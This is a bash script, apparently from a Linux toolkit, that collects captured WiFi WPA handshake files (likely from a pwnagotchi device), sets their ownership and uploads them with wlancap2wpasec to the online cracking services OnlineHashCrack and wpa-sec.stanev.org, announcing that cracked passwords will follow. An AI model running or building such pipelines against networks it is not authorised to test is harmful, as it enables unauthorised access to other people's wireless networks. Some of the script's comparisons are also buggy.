#!/bin/bash
# set a variable for handshakes directory so it can be changed in program
# Version: 0.0.2
handshakes_dir=/opt/backup/root/handshakes
scripts_dir=/opt/easy-linux
set -e
# Add Color
source ${scripts_dir}/.envrc
#
trap ${scripts_dir}/support/support-trap-wifi.sh EXIT
source ${scripts_dir}/support/support-Banner_func.sh

upload_func() {
    printf " ${GN} [X] ${CY}Gzip is not supported on ${WT}OnlineHashCrack.\\n ${GN} [X] ${CY}Not compressing files. \\n ${GN} [*] ${CY}Uploading pcap's to OHC.${OG}\\n"
    wlancap2wpasec -u https://api.onlinehashcrack.com  -e $pro_email /opt/backup/root/handshakes/*.pcap
    printf " ${GN} [*] ${CY}Send all cap's to OHC.${OG}\\n"
    wlancap2wpasec -u https://api.onlinehashcrack.com  -e $pro_email /opt/backup/root/handshakes/*.cap
    printf " ${GN} [*] ${WT}Compress all PCAP and CAP files.\\n ${GN} [*] ${CY} Uploading to ${WT}WPA-Stanev${OG}.\\n"
    gzip -v -9 --synchronous /opt/backup/root/handshakes/*.pcap
    gzip -v -9 --synchronous /opt/backup/root/handshakes/*.cap
    printf " ${GN} [*] ${CY}Send all compressed ${WT}pcap's${CY} to ${WT}WPA-Stanev${CY}.\\n ${GN} [*] ${CY}Remove successful uploads.${OG}\\n"
    wlancap2wpasec -k $wpa_api -t 45  -R \
    /opt/backup/root/handshakes/*.pcap.gz
    printf " ${GN} [*] ${CY}Send all compressed ${WT}cap's${CY} to ${WT}WPA-Stanev${CY}.\\n ${GN} [*] ${CY}Remove successful uploads.${OG}\\n"
    wlancap2wpasec -k $wpa_api -t 45 \
    /opt/backup/root/handshakes/*.cap.gz
    printf " ${GN} [X] ${WT}Gzip ${CY}is not supported on ${WT}OnlineHashCrack${CY}.\\n ${GN} [*] ${CY}Uploading ${WT}hccapx ${CY}files to ${WT}OHC.${OG}\\n"
    wlancap2wpasec -u https://api.onlinehashcrack.com  -e $pro_email \
    /opt/backup/root/hccapx/*.hccapx
    printf " ${GN} [X] ${CY}HCCAPX isn't supported on WPA-Stanev.\\n"
    clear
}

permissions_func() {
    # make sure permissions are ok.
    if [[ $HOST -eq $cwb_computername ]] && [[ $USER -eq $cwb_username]]; then
        pwnagotchi=Gotcha
        line=$(grep -n "pwnagotchi=" .envrc | cut -d: -f1)
        sed -i "${line}s/.*/pwnagotchi=${pwnagotchi}/" .envrc
        sudo chown -vR $cwb_username:$cwb_username /opt/backup/root/*
    elif [[ $HOST == $ldb_computername ]] && [[ $USER -eq $ldb_username ]]; then
        pwnagotchi=Sniffer
        line=$(grep -n "pwnagotchi=" .envrc | cut -d: -f1)
        sed -i "${line}s/.*/pwnagotchi=${pwnagotchi}/" .envrc
        sudo chown -vR $ldb_username:$ldb_username /opt/backup/root/*
    else
        sudo chown -vR root:root /opt/backup/root/*
    fi
upload_func
}

folders_exist_func() {
    # make sure /opt/backup/root exists
    if [[ ! -d /opt/backup/ ]]; then
        sudo mkdir /opt/backup
    fi
    if [[ ! -d /opt/backup/root/ ]]; then
        sudo mkdir /opt/backup/root/
    fi
    if [[ ! -d "${handshakes_dir}" ]]; then
        sudo mkdir /opt/backup/root/handshakes
    fi
permissions_func
}

main() {
    clear
    source "${scripts_dir}/support/support-Banner_func.sh"
    printf "  ${CY}This script backs up your saved hashes from ${WT}$handshakes${CY}.\\n"

    folders_exist_func
}

main
clear
printf "${CY}All Operations completed. Cracked passwords will start appearing on \\n"
printf "https://www.OnlineHashCrack.com and https://wpa-sec.stanev.org within 24hr.\\n"
printf "Press ${WT}any${CY} key to return to ${WT}Main Menu.\\n "
read -n 1 -r -t 300
source ${scripts_dir}/menu-master.sh
